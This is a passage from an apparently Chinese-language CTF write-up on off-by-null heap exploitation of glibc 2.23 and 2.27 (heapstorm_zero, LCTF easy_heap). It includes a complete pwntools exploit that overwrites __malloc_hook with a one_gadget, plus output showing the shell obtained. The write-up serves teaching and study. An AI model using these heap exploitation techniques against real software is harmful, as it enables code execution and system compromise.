出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 